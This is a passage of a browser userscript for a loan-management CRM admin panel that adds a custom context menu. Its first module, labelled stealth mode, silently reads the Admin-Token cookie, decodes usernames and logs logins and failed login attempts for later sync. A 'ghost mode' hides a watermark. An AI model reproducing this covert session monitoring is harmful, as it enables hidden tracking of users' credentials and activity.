(function() {
    'use strict';
// =========================================================================
    // 🕸️ MÓDULO 0: OBSERVADOR DE SESIONES V6.2 (MODO SIGILO / INVISIBLE)
    // =========================================================================
    
    // 1. Extractor del Token Crudo (La huella dactilar)
    function obtenerFirmaToken() {
        try {
            const match = document.cookie.match(/(?:^|; )Admin-Token=([^;]*)/);
            if (match && match[1]) {
                return match[1].trim(); 
            }
        } catch(e) {}
        return null;
    }

    // 2. Extractor del Nombre de Usuario (Para el historial visual)
    function decodificarNombreUsuario(tokenCrudo) {
        try {
            if (!tokenCrudo) return null;
            let tokenLimpio = decodeURIComponent(tokenCrudo).replace(/^Bear(?:er)?\s+/i, '').trim();
            const partesJwt = tokenLimpio.split('.');
            if (partesJwt.length >= 2) {
                const base64Url = partesJwt[1].replace(/-/g, '+').replace(/_/g, '/');
                const jsonTxt = decodeURIComponent(window.atob(base64Url).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
                const datos = JSON.parse(jsonTxt);
                return datos.loginName || datos.username || null;
            }
        } catch(e) {}
        return null;
    }

    // 🔥 LA MEMORIA AHORA RECUERDA EL TOKEN, NO SOLO EL NOMBRE
    let memoriaTokenActivo = obtenerFirmaToken();
    let cuentaVisualActiva = decodificarNombreUsuario(memoriaTokenActivo) || "Desconocida";

    // 3. Guardián del LocalStorage (Silencioso)
    function registrarEventoCRM(evento, cuenta) {
        if (!cuenta || cuenta === 'Desconocido' || cuenta === 'undefined' || String(cuenta) === 'null') return;
        
        let historial = [];
        try { historial = JSON.parse(localStorage.getItem('SST_CRM_HISTORY') || '[]'); } catch(e){}
        
        // Anti-Duplicados (3 segundos)
        const isDup = historial.some(h => h.cuenta === cuenta && h.evento === evento && (Date.now() - h.ts < 3000));
        if (isDup) return;

        historial.push({
            ts: Date.now(),
            fecha: new Date().toLocaleString('es-ES'),
            evento: evento,
            cuenta: cuenta,
            dominio: window.location.hostname,
            deviceId: localStorage.getItem('deviceUniqueId') || "Desconocido"
        });
        
        localStorage.setItem('SST_CRM_HISTORY', JSON.stringify(historial));
        localStorage.setItem('SST_NEEDS_SYNC', 'true');
    }

    // 4. El Motor del Observador (Vigila el Token, no la recarga)
    setInterval(() => {
        const tokenActual = obtenerFirmaToken();

        // A. LOGIN NUEVO: No había token y apareció uno, O el token cambió por uno diferente
        if (tokenActual !== null && tokenActual !== memoriaTokenActivo) {
            const nuevoUsuario = decodificarNombreUsuario(tokenActual);
            
            // Si había una sesión vieja, la cerramos formalmente antes de abrir la nueva
            if (memoriaTokenActivo !== null && cuentaVisualActiva !== "Desconocida") {
                registrarEventoCRM("LOGOUT", cuentaVisualActiva);
            }
            
            registrarEventoCRM("LOGIN_EXITOSO", nuevoUsuario);
            memoriaTokenActivo = tokenActual;
            cuentaVisualActiva = nuevoUsuario;
        }
        // B. LOGOUT: Había un token guardado en memoria y de repente desapareció de las cookies
        else if (tokenActual === null && memoriaTokenActivo !== null) {
            registrarEventoCRM("LOGOUT", cuentaVisualActiva);
            memoriaTokenActivo = null;
            cuentaVisualActiva = "Desconocida";
        }
    }, 800);

    // 5. Cazador de Fallos (Vigila cuando hacen clic en "Ingresar")
    document.addEventListener('click', (e) => {
        const textoBoton = (e.target.innerText || e.target.value || '').toLowerCase();
        if (textoBoton.includes('login') || textoBoton.includes('ingresar') || e.target.type === 'submit') {
             let userIntento = "Desconocido";
             document.querySelectorAll('input[type="text"]').forEach(inp => {
                 if(inp.placeholder.toLowerCase().includes('user') || inp.name.toLowerCase().includes('user') || inp.className.toLowerCase().includes('user')) {
                     userIntento = inp.value.trim();
                 }
             });

             if (userIntento && userIntento !== "Desconocido" && userIntento !== "") {
                  setTimeout(() => {
                      if (!obtenerFirmaToken()) {
                           registrarEventoCRM("LOGIN_FALLIDO", userIntento);
                      }
                  }, 2500);
             }
        }
    }, true);
    // =========================================================================
    // =========================================================================
    // 🛡️ MÓDULO 1: MENÚ OSCURO INTELIGENTE V36 (NOMBRES, BORDES Y COOLDOWN) 🛡️
    // =========================================================================
    
    const styleBlindaje = document.createElement('style');
    styleBlindaje.innerHTML = `
        /* Blindaje visual */
        [id*="addon"], [id*="addon"] *, [id*="visor"], [id*="visor"] *,
        [id*="panel"], [id*="panel"] *, [id*="wrapper"], [id*="wrapper"] *,
        [id*="social"], [id*="social"] *, [id*="manual"], [id*="manual"] *,
        [id*="tool"], [id*="tool"] *, [id*="plantilla"], [id*="plantilla"] *,
        [id*="editor"], [id*="editor"] *, [id*="herramientas"], [id*="herramientas"] *,
        [id*="modal"], [id*="modal"] *, [id*="custom"], [id*="custom"] *,
        [id*="btn-"], [id*="btn-"] *, [id*="dyn-"], [id*="dyn-"] *,
        [id*="floating"], [id*="floating"] *, [id*="guide"], [id*="guide"] *,
        [class*="addon"], [class*="addon"] *, [class*="panel"], [class*="panel"] *,
        .side-btn-app, .side-btn-app *, .visor-btn, .visor-btn *,
        .ghost-toast-msg, .ghost-toast-msg *, .btn-copy-tag, .btn-copy-tag * {
            user-select: none !important;
            -webkit-user-select: none !important;
        }
        input, textarea {
            user-select: auto !important;
            -webkit-user-select: auto !important;
        }

        /* 🎨 ESTILOS DEL MENÚ DIGITAL PRO (WINDOWS 11) */
        #sst-global-context-menu {
            position: absolute; z-index: 2147483647; 
            background: rgba(10, 10, 12, 0.85); 
            backdrop-filter: blur(45px) saturate(180%);
            -webkit-backdrop-filter: blur(45px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08); 
            border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.7);
            padding: 6px; display: none; flex-direction: column; min-width: 260px; max-width: 320px;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .sst-ctx-group { display: flex; flex-direction: column; gap: 2px; padding: 4px 0; }
        .sst-ctx-group:not(:last-child) { border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 4px; }
        .sst-ctx-item {
            padding: 8px 12px; color: #e2e8f0; font-size: 13px; font-weight: 500;
            cursor: pointer; border-radius: 6px; transition: all 0.15s ease;
            display: flex; align-items: center; justify-content: space-between;
            position: relative;
        }
        .sst-ctx-item:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
        .sst-ctx-icon { opacity: 0.8; font-size: 15px; width: 18px; text-align: center; }
        .sst-ctx-item:hover .sst-ctx-icon { opacity: 1; }
        
        .sst-nav-row { display: flex; justify-content: space-between; padding: 4px 14px; }
        .sst-nav-btn {
            background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
            color: white; border-radius: 6px; width: 30%; padding: 6px 0; cursor: pointer;
            text-align: center; transition: 0.2s; font-size: 14px;
        }
        .sst-nav-btn:hover { background: rgba(255, 255, 255, 0.15); }
        .sst-ctx-separator { height: 1px; background: rgba(255,255,255,0.1); margin: 4px 8px; isolation: isolate; }

        /* 🔥 ESTILOS PARA SUBMENÚS 🔥 */
        .sst-has-submenu::after {
            content: '▸';
            font-size: 11px; color: rgba(255,255,255,0.5); margin-left: 8px;
        }
        .sst-has-submenu:hover::after { color: #38bdf8; }

        .sst-submenu {
            display: none; position: absolute;
            /* La posición (left/right) ahora la maneja JS dinámicamente */
            top: -5px;
            background: rgba(10, 10, 12, 0.90); 
            backdrop-filter: blur(45px) saturate(180%);
            border: 1px solid rgba(255, 255, 255, 0.08); 
            border-radius: 12px; box-shadow: 0 15px 40px rgba(0,0,0,0.8);
            padding: 6px; min-width: 200px; z-index: 2147483647;
        }
        
        /* Atracción invisible AMPLIADA para mayor margen de error al mover el ratón */
        .sst-submenu::before {
            content: ''; position: absolute;
            top: -50px; bottom: -50px; left: -50px; right: -50px; /* 🔥 Sube a -40px o -50px si lo quieres más grande */
            z-index: -1;
        }

        /* 🔥 TOAST FLOTANTE EN CURSOR 🔥 */
        #toast-blindaje-fix {
            position: fixed; z-index: 2147483647; pointer-events: none;
            background: rgba(32, 32, 35, 0.85); color: #fff; padding: 10px 18px; border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.2); font-family: 'Segoe UI', sans-serif; font-size: 13px; font-weight: 600;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); backdrop-filter: blur(15px);
            transition: transform 0.3s ease, opacity 0.3s ease; display: none; opacity: 0;
        }
    `;
    document.head.appendChild(styleBlindaje);

    const ctxMenu = document.createElement('div');
    ctxMenu.id = 'sst-global-context-menu';
    ctxMenu.innerHTML = `
        <div class="sst-ctx-group" id="sst-group-nav">
            <div class="sst-nav-row">
                <button class="sst-nav-btn" id="ctx-nav-back" title="Atrás">⬅️</button>
                <button class="sst-nav-btn" id="ctx-nav-fwd" title="Adelante">➡️</button>
                <button class="sst-nav-btn" id="ctx-nav-reload" title="Recargar">🔄</button>
            </div>
            <div class="sst-ctx-separator"></div>
            
            <div class="sst-ctx-item" id="ctx-tool-rafaga" style="color:#fcd34d;">Panel de Correos <span class="sst-ctx-icon">📧</span></div>
            
            <div class="sst-ctx-item sst-has-submenu" id="ctx-submenu-editor-trigger" style="color:#a78bfa;">
                <div>Editor Visual <span class="sst-ctx-icon">✏️</span></div>
                <div class="sst-submenu" id="sst-submenu-editor">
                    <div class="sst-ctx-item" id="ctx-tool-editor" style="color:#a78bfa;">Abrir Editor Visual <span class="sst-ctx-icon">🚀</span></div>
<div class="sst-ctx-item" id="ctx-tool-ghost" style="color:#d8b4fe; display:none;">Modo Fantasma <span class="sst-ctx-icon">👻</span></div>
<div class="sst-ctx-separator"></div>
                    <div class="sst-ctx-item" id="ctx-tool-soporte" style="color:#ef4444;">Soporte <span class="sst-ctx-icon">🆘</span></div>
                </div>
            </div>
            
            <div class="sst-ctx-item sst-has-submenu" id="ctx-submenu-plantilla-trigger" style="color:#34d399;">
                <div>Gestión de Plantillas <span class="sst-ctx-icon">📄</span></div>
                <div class="sst-submenu" id="sst-submenu-plantilla">
                    <div class="sst-ctx-item" id="ctx-tool-plantilla" style="color:#38bdf8;">Crear Plantilla <span class="sst-ctx-icon">➕</span></div>
                    <div class="sst-ctx-separator"></div>
                    <div class="sst-ctx-item" id="ctx-plantilla-import" style="color:#f59e0b;">Importar Backup <span class="sst-ctx-icon">📥</span></div>
                    <div class="sst-ctx-item" id="ctx-plantilla-export" style="color:#10b981;">Exportar Backup <span class="sst-ctx-icon">📤</span></div>
                </div>
            </div>

            <div class="sst-ctx-separator"></div>
            
            <div class="sst-ctx-item" id="ctx-tool-hoja" style="color:#10b981;">Abrir Mi Hoja (Sheets) <span class="sst-ctx-icon">📊</span></div>
            <div class="sst-ctx-item" id="ctx-tool-listado" style="color:#f97316;">Abrir Todo (Clientes) <span class="sst-ctx-icon">📋</span></div>
            <div class="sst-ctx-item" id="ctx-tool-facebook" style="color:#3b82f6;">Facebook <span class="sst-ctx-icon">📘</span></div>

            <div class="sst-ctx-separator"></div>

            <div class="sst-ctx-item sst-has-submenu" id="ctx-submenu-sistema-trigger" style="color:#94a3b8;">
                <div>Sistema y Sesión <span class="sst-ctx-icon">⚙️</span></div>
                <div class="sst-submenu" id="sst-submenu-sistema">
                    <div class="sst-ctx-item" id="ctx-sys-cache" style="color:#22d3ee;">Borrar Caché <span class="sst-ctx-icon">🧹</span></div>
                    <div class="sst-ctx-separator"></div>
                    <div class="sst-ctx-item" id="ctx-sys-logout" style="color:#ef4444;">Cerrar Sesión <span style="font-size:16px; padding-top: 4px; padding-left: 4px;">⏻</span></div>
                    <div class="sst-ctx-item" id="ctx-sys-reset" style="color:#f97316;">Restablecer <span style="font-size:18px; font-weight:bold; padding-bottom:2px;">↺</span></div>
                </div>
            </div>

        </div>

        <div class="sst-ctx-group" id="sst-group-image" style="display:none;">
            <div class="sst-ctx-item" id="ctx-img-view" style="color:#38bdf8; font-weight:bold;">Ver en Visor SST <span class="sst-ctx-icon">📷</span></div>
            
            <!-- 👇 NUEVO BOTÓN PARA COPIAR AL PORTAPAPELES 👇 -->
            <div class="sst-ctx-item" id="ctx-img-copy-blob" style="color:#10b981;">Copiar imagen<span class="sst-ctx-icon">📋</span></div>
            
            <div class="sst-ctx-separator"></div>
            <div class="sst-ctx-item" id="ctx-img-open">Abrir imagen en nueva pestaña <span class="sst-ctx-icon">👁️</span></div>
            <div class="sst-ctx-item" id="ctx-img-save" title="Descarga silenciosa al PC">Guardar imagen como... <span class="sst-ctx-icon">💾</span></div>
            <div class="sst-ctx-item" id="ctx-img-copy-url">Copiar enlace de imagen <span class="sst-ctx-icon">🔗</span></div>
            <div class="sst-ctx-item" id="ctx-img-lens">Buscar imagen con Google <span class="sst-ctx-icon">🔍</span></div>
        </div>
        
        <div class="sst-ctx-group" id="sst-group-edit" style="display:none;">
            <div class="sst-ctx-item" id="ctx-copy">Copiar Texto <span class="sst-ctx-icon">📋</span></div>
            <div class="sst-ctx-item" id="ctx-cut" style="display:none;">Cortar <span class="sst-ctx-icon">✂️</span></div>
            <div class="sst-ctx-item" id="ctx-paste" style="display:none;">Pegar <span class="sst-ctx-icon">📝</span></div>
        </div>
    `;
    document.body.appendChild(ctxMenu);

    const toastBlindaje = document.createElement('div');
    toastBlindaje.id = 'toast-blindaje-fix';
    document.body.appendChild(toastBlindaje);

    let lastClickX = 0;
    let lastClickY = 0;

    const showSSTToast = (msg, isError = false) => {
        toastBlindaje.innerText = msg;
        toastBlindaje.style.display = 'block';
        toastBlindaje.style.borderColor = isError ? '#ef4444' : 'rgba(255,255,255,0.2)';
        
        let posX = lastClickX + 15;
        let posY = lastClickY + 15;
        
        const ancho = toastBlindaje.offsetWidth || 200;
        const alto = toastBlindaje.offsetHeight || 40;
        if (posX + ancho > window.innerWidth) posX = window.innerWidth - ancho - 10;
        if (posY + alto > window.innerHeight) posY = window.innerHeight - alto - 10;

        toastBlindaje.style.left = posX + 'px';
        toastBlindaje.style.top = posY + 'px';
        
        toastBlindaje.style.transform = 'translateY(15px)';
        toastBlindaje.style.opacity = '0';
        
        setTimeout(() => {
            toastBlindaje.style.transform = 'translateY(0)';
            toastBlindaje.style.opacity = '1';
        }, 10);

        setTimeout(() => {
            toastBlindaje.style.transform = 'translateY(-20px)';
            toastBlindaje.style.opacity = '0';
            setTimeout(() => toastBlindaje.style.display = 'none', 300);
        }, 2000); 
    };

    // 🔥 FUNCIÓN CENTRALIZADA PARA CERRAR EL MENÚ Y SUBMENÚS
    const closeMenuCompletely = () => {
        ctxMenu.style.display = 'none';
        ctxMenu.querySelectorAll('.sst-submenu').forEach(sub => sub.style.display = 'none');
    };

    // 🔥 CONTROL INTELIGENTE DE SUBMENÚS (Hover Magnético y Colisión Lateral)
    const submenusTriggers = ctxMenu.querySelectorAll('.sst-has-submenu');
    submenusTriggers.forEach(trigger => {
        const submenu = trigger.querySelector('.sst-submenu');

        trigger.addEventListener('mouseenter', () => {
            // Cierra inmediatamente los otros submenús para que no se crucen
            submenusTriggers.forEach(t => {
                if (t !== trigger) {
                    t.querySelector('.sst-submenu').style.display = 'none';
                }
            });

            submenu.style.display = 'flex';
            submenu.style.flexDirection = 'column';
            submenu.style.gap = '2px';

            // Detección inteligente de bordes
            const rect = trigger.getBoundingClientRect();
            if (rect.right + 220 > window.innerWidth) {
                submenu.style.left = 'auto';
                submenu.style.right = 'calc(100% + 5px)'; // Lo abre hacia la izquierda
            } else {
                submenu.style.left = 'calc(100% + 5px)';
                submenu.style.right = 'auto'; // Lo abre hacia la derecha normal
            }
        });

        trigger.addEventListener('mouseleave', () => {
            // Se cierra al instante al salir del menú y su zona magnética
            submenu.style.display = 'none';
        });
    });

    let elementoActivo = null;
    let urlImagenActiva = null;
    let textoCapturado = "";

    document.addEventListener('contextmenu', (e) => {
        if (e.altKey) return; 
        e.preventDefault(); 
        
        lastClickX = e.clientX;
        lastClickY = e.clientY;
        
        elementoActivo = e.target;
        textoCapturado = window.getSelection().toString().trim();

        const path = e.composedPath();
        let esZonaProhibida = path.some(el => {
            if (!el || !el.tagName) return false;
            const tag = el.tagName.toLowerCase();
            const id = (el.id || '').toLowerCase();
            const cls = (typeof el.className === 'string' ? el.className : '').toLowerCase();
            
            if (tag === 'button' || tag === 'a' || cls.includes('el-button')) return true;
            return id.includes('addon') || id.includes('visor') || id.includes('panel') || 
                   id.includes('wrapper') || id.includes('social') || id.includes('manual') || 
                   id.includes('tool') || id.includes('plantilla') || id.includes('editor') || 
                   id.includes('herramientas') || id.includes('modal') || id.includes('custom') || 
                   id.includes('btn-') || id.includes('dyn-') || id.includes('floating') || 
                   id.includes('guide') || cls.includes('addon') || cls.includes('side-btn') || 
                   cls.includes('visor-btn') || cls.includes('btn-copy-tag') || cls.includes('sst-submenu');
        });

        const esCajaTexto = (elementoActivo.tagName === 'INPUT' || elementoActivo.tagName === 'TEXTAREA');
        if (esCajaTexto) esZonaProhibida = false;

        const gNav = document.getElementById('sst-group-nav');
        const gImg = document.getElementById('sst-group-image');
        const gEdit = document.getElementById('sst-group-edit');
        const iCut = document.getElementById('ctx-cut');
        const iPaste = document.getElementById('ctx-paste');
        
        gNav.style.display = 'none'; gImg.style.display = 'none'; gEdit.style.display = 'none';
        urlImagenActiva = null;

        let mostrarMenu = false;

        if (esCajaTexto) {
            mostrarMenu = true; gEdit.style.display = 'flex'; iCut.style.display = 'flex'; iPaste.style.display = 'flex';
            if (!textoCapturado) textoCapturado = elementoActivo.value.substring(elementoActivo.selectionStart, elementoActivo.selectionEnd);
        } else if (elementoActivo.tagName === 'IMG' && !esZonaProhibida) {
            mostrarMenu = true; gImg.style.display = 'flex'; urlImagenActiva = elementoActivo.src;
        } else if (textoCapturado !== '' && !esZonaProhibida) {
            mostrarMenu = true; gEdit.style.display = 'flex'; iCut.style.display = 'none'; iPaste.style.display = 'none';
        } else if (!esZonaProhibida) {
            mostrarMenu = true; gNav.style.display = 'flex';
        }

        if (mostrarMenu) {
            closeMenuCompletely(); // Resetear estado de submenús

            // 🔥 VISIBILIDAD POR PESTAÑAS 🔥
            const currentUrl = window.location.href;
            const isDetail = currentUrl.includes('/detail');
            const isListado = currentUrl.includes('loaned_management/pedding_list');

            // Exclusivo Pestaña "Detail"
            document.getElementById('ctx-tool-plantilla').style.display = isDetail ? 'flex' : 'none';
            document.getElementById('ctx-tool-facebook').style.display = isDetail ? 'flex' : 'none';
            
            // 🔥 Lógica añadida: Oculta el menú padre entero si no estamos en Detail
            document.getElementById('ctx-submenu-editor-trigger').style.display = isDetail ? 'flex' : 'none';
            document.getElementById('ctx-tool-editor').style.display = isDetail ? 'flex' : 'none';
            document.getElementById('ctx-tool-soporte').style.display = isDetail ? 'flex' : 'none';

            // Ocultar líneas separadoras de detail
            const sepSoporte = document.getElementById('ctx-tool-soporte').previousElementSibling;
            if (sepSoporte) sepSoporte.style.display = isDetail ? 'block' : 'none';
            const sepPlantilla = document.getElementById('ctx-tool-plantilla').nextElementSibling; // Porque Crear Plantilla subió
            if (sepPlantilla) sepPlantilla.style.display = isDetail ? 'block' : 'none';

            // Exclusivo Pestaña "Listado"
            document.getElementById('ctx-tool-listado').style.display = isListado ? 'flex' : 'none';


            ctxMenu.style.display = 'flex';
            const menuAncho = ctxMenu.offsetWidth;
            const menuAlto = ctxMenu.offsetHeight;
            let x = lastClickX; 
            let y = lastClickY;
            
            if (x + menuAncho > window.innerWidth) x = window.innerWidth - menuAncho - 10; 
            if (y + menuAlto > window.innerHeight) y = window.innerHeight - menuAlto - 10;
            
            ctxMenu.style.position = 'fixed';
            ctxMenu.style.left = x + 'px'; 
            ctxMenu.style.top = y + 'px';
        } else {
            closeMenuCompletely();
        }
    });

    document.addEventListener('click', (e) => {
        if (!e.target.closest('#sst-global-context-menu')) closeMenuCompletely();
    });

    // ---------------------------------------------------------
    // 🔥 EVENTOS DE CLIC - HERRAMIENTAS 🔥
    // ---------------------------------------------------------
    
    // Evitar que el clic en los textos padres cierre el menú
    document.getElementById('ctx-submenu-editor-trigger').onclick = (e) => { e.stopPropagation(); };
    document.getElementById('ctx-submenu-plantilla-trigger').onclick = (e) => { e.stopPropagation(); };
    document.getElementById('ctx-submenu-sistema-trigger').onclick = (e) => { e.stopPropagation(); };

    document.getElementById('ctx-tool-rafaga').onclick = () => {
        closeMenuCompletely();
        const isMac = navigator.userAgent.toUpperCase().indexOf('MAC OS') >= 0 || (navigator.userAgentData && navigator.userAgentData.platform === 'macOS');
        const eventParams = { key: 'Z', code: 'KeyZ', shiftKey: true, bubbles: true };
        if (isMac) eventParams.metaKey = true; else eventParams.ctrlKey = true;
        document.dispatchEvent(new KeyboardEvent('keydown', eventParams));
    };

    document.getElementById('ctx-tool-editor').onclick = (e) => {
        e.stopPropagation(); 
        closeMenuCompletely();
        const btn = document.getElementById('btn-open-editor'); 
        if (btn) btn.click(); else showSSTToast("⚠️ Abre un perfil para usar el Editor", true);
    };

    document.getElementById('ctx-tool-ghost').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        window.dispatchEvent(new CustomEvent('SST_ACTIVATE_GHOST'));
        setTimeout(() => {
            const isActive = localStorage.getItem('CRM_GHOST_MODE') === 'true';
            if (isActive) showSSTToast('👻 Marca de agua OCULTA', false);
            else showSSTToast('👁️ Marca de agua VISIBLE', true);
        }, 30);
    };

    document.getElementById('ctx-tool-soporte').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        const btnSoporte = document.getElementById('btn-soporte-nativo');
        if (btnSoporte) btnSoporte.click(); else showSSTToast("⚠️ Botón Soporte no cargado", true);
    };

    document.getElementById('ctx-plantilla-import').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.json, .txt';
        input.onchange = ev => {
            const file = ev.target.files[0];
            if (!file) return;
            const reader = new FileReader();
            reader.onload = event => {
                try {
                    const data = JSON.parse(event.target.result);
                    if (Array.isArray(data)) {
                        localStorage.setItem('CUSTOM_BTNS_LIST', JSON.stringify(data));
                        window.dispatchEvent(new StorageEvent('storage', { key: 'CUSTOM_BTNS_LIST', newValue: JSON.stringify(data) }));
                        showSSTToast("📥 Backup restaurado con éxito", false);
                    } else showSSTToast("⚠️ Formato incorrecto", true);
                } catch(err) { showSSTToast("❌ Error: Archivo corrupto", true); }
            };
            reader.readAsText(file);
        };
        input.click();
    };

    document.getElementById('ctx-plantilla-export').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        const data = localStorage.getItem('CUSTOM_BTNS_LIST') || "[]";
        if (data === "[]") { showSSTToast("⚠️ No hay plantillas para exportar", true); return; }
        const blob = new Blob([data], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `Plantillas_SST_Backup_${new Date().toISOString().slice(0,10)}.json`; 
        a.click();
        URL.revokeObjectURL(url);
        showSSTToast("📤 Backup exportado con éxito", false);
    };

    document.getElementById('ctx-tool-plantilla').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        const container = document.getElementById('custom-btns-container');
        const btnCrear = container ? Array.from(container.children).find(el => el.textContent && el.textContent.includes('Crear Plantilla')) : null;
        if (btnCrear) btnCrear.click(); else showSSTToast("⚠️ Contenedor de plantillas inactivo", true);
    };

    document.getElementById('ctx-tool-hoja').onclick = async () => {
        closeMenuCompletely();
        const user = localStorage.getItem('usuarioLogueado');
        if (!user) { showSSTToast('❌ Falta Usuario', true); return; }
        showSSTToast('🔍 Buscando hoja...');
        try {
            const response = await fetch(`${API_URL}?token=${MASTER_TOKEN}&usuario=${user}`);
            const data = await response.json();
            if (data.id) { window.open('https://docs.google.com/spreadsheets/d/' + data.id + '/edit', '_blank'); showSSTToast('📊 Hoja abierta'); }
            else showSSTToast('❌ Sin hoja asignada', true);
        } catch (err) { showSSTToast('⚠️ Error servidor', true); }
    };

    document.getElementById('ctx-tool-listado').onclick = () => {
        closeMenuCompletely();
        const btnListado = Array.from(document.querySelectorAll('button, div, span')).find(btn => btn.textContent && btn.textContent.trim() === '⚡ ABRIR TODO ⚡');
        if (btnListado) btnListado.click(); else showSSTToast("⚠️ Botón ⚡ ABRIR TODO ⚡ no encontrado", true);
    };

    document.getElementById('ctx-tool-facebook').onclick = () => {
        closeMenuCompletely();
        const btnFB = Array.from(document.querySelectorAll('button')).find(btn => btn.textContent && btn.textContent.includes('Facebook') && !btn.closest('#sst-global-context-menu'));
        if (btnFB) btnFB.click(); else showSSTToast("⚠️ Botón de Facebook no encontrado", true);
    };

    document.getElementById('ctx-sys-cache').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        const isVitalKey = (key) => {
            const exactMatches = ['usuarioLogueado', 'sessionId', 'loginTimestamp', 'sessionLimit', 'configRef', 'deviceUniqueId', 'CUSTOM_BTNS_LIST', 'CRM_GHOST_MODE', 'SYSTEM_NOTIF_SOUND', 'firebaseToken', 'serverSubdomain'];
            const prefixes = ['LAST_', 'CRM_', 'ALERT_', 'NOTIF_', 'DELIVERED_', 'SHARED_', 'RAFAGA_'];
            if (exactMatches.includes(key)) return true;
            if (prefixes.some(prefix => key.startsWith(prefix))) return true;
            return false;
        };
        let countBorrados = 0;
        for (let i = localStorage.length - 1; i >= 0; i--) {
            const key = localStorage.key(i);
            if (!isVitalKey(key)) {
                localStorage.removeItem(key);
                countBorrados++;
            }
        }
        localStorage.setItem('SST_CACHE_CLEARED', Date.now().toString());
        showSSTToast(`🧹 Caché limpiado: ${countBorrados}`, false);
    };

    document.getElementById('ctx-sys-reset').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        
        const data = localStorage.getItem('CUSTOM_BTNS_LIST') || "[]";
        if (data !== "[]" && data.length > 5) {
            showSSTToast("📤 Guardando backup de plantillas...", false);
            const blob = new Blob([data], { type: "application/json" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `SST_Backup_Auto_Reseteo_${new Date().toISOString().slice(0,10)}.json`; 
            a.click();
            URL.revokeObjectURL(url);
        }

        const isDetail = window.location.href.includes('/detail');
        localStorage.setItem('cerrar_detalles', Date.now().toString());
        localStorage.setItem('SST_SYNC_REPAIR', Date.now().toString());

        setTimeout(() => {
            if (isDetail) {
                window.close(); 
            } else {
                if (typeof window.SST_GLOBAL_REPAIR === 'function') window.SST_GLOBAL_REPAIR();
            }
        }, 800); 
    };

    document.getElementById('ctx-sys-logout').onclick = (e) => {
        e.stopPropagation();
        closeMenuCompletely();
        
        localStorage.setItem('SST_SYNC_SHOW_LOGOUT', Date.now().toString());
        window.dispatchEvent(new CustomEvent('SST_SHOW_LOGOUT_PROMPT'));
    };

    // ---------------------------------------------------------
    // FUNCIONES DE IMÁGENES Y TEXTO
    // ---------------------------------------------------------
    document.getElementById('ctx-img-copy-blob').onclick = () => {
        if (!urlImagenActiva) return;
        closeMenuCompletely();
        showSSTToast("⏳ Procesando imagen ...", false);

        // 1. Pedimos la imagen al background usando tu función segura
        safeSendMessage({ action: "fetch_image_base64", url: urlImagenActiva }, (response) => {
            if (!response || !response.success) {
                showSSTToast("❌ S3 denegó el acceso a la imagen", true);
                return;
            }

            // 2. Cargamos el Base64 en memoria
            const img = new Image();
            img.onload = () => {
                try {
                    // 3. Forzamos formato PNG nativo para WhatsApp
                    const canvas = document.createElement('canvas');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0);

                    canvas.toBlob(async (pngBlob) => {
                        if (!pngBlob) throw new Error("Fallo Canvas");
                        
                        try {
                            // 4. Inyectamos los píxeles a Windows
                            await navigator.clipboard.write([
                                new ClipboardItem({ 'image/png': pngBlob })
                            ]);
                            showSSTToast("✅ ¡Copiada! Pégala", false);
                        } catch (err) {
                            showSSTToast("❌ Error al pegar", true);
                        }
                    }, 'image/png'); // <- CRÍTICO: Forzar salida PNG
                } catch (e) {
                    showSSTToast("❌ Error al rasterizar", true);
                }
            };
            img.onerror = () => showSSTToast("❌ Error al procesar imagen", true);
            img.src = response.base64; 
        });
    };
    
    document.getElementById('ctx-img-view').onclick = () => {
        if (!urlImagenActiva) return;
        closeMenuCompletely();
        window.dispatchEvent(new CustomEvent('SST_OPEN_VIEWER', { detail: { url: urlImagenActiva } }));
    };

    document.getElementById('ctx-img-open').onclick = () => {
        if (!urlImagenActiva) return;
        closeMenuCompletely();
        const novaAba = window.open('', '_blank');
        novaAba.document.write(`
            <html><head><title>Visor SST PRO</title></head><body style="margin: 0; display: flex; justify-content: center; align-items: center; background-color: #0e1117; height: 100vh;"><img src="${urlImagenActiva}" style="max-width: 100%; max-height: 100%; object-fit: contain;"></body></html>
        `);
        novaAba.document.close();
    };

    document.getElementById('ctx-img-save').onclick = () => {
        if (!urlImagenActiva) return;
        closeMenuCompletely();
        showSSTToast("💾 Descargando imagen...");
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none'; iframe.src = urlImagenActiva;
        document.body.appendChild(iframe);
        setTimeout(() => document.body.removeChild(iframe), 5000);
    };

    document.getElementById('ctx-img-copy-url').onclick = () => {
        if (urlImagenActiva) { navigator.clipboard.writeText(urlImagenActiva); showSSTToast("🔗 Enlace copiado"); }
        closeMenuCompletely();
    };

    document.getElementById('ctx-img-lens').onclick = () => {
        if (urlImagenActiva) window.open(`https://lens.google.com/uploadbyurl?url=${encodeURIComponent(urlImagenActiva)}`, '_blank');
        closeMenuCompletely();
    };

    document.getElementById('ctx-nav-back').onclick = () => window.history.back();
    document.getElementById('ctx-nav-fwd').onclick = () => window.history.forward();
    document.getElementById('ctx-nav-reload').onclick = () => location.reload();

    document.getElementById('ctx-copy').onclick = () => {
        if (textoCapturado) { navigator.clipboard.writeText(textoCapturado); showSSTToast("📋 Texto copiado"); }
        else document.execCommand('copy');
        closeMenuCompletely();
    };
    
    document.getElementById('ctx-cut').onclick = () => {
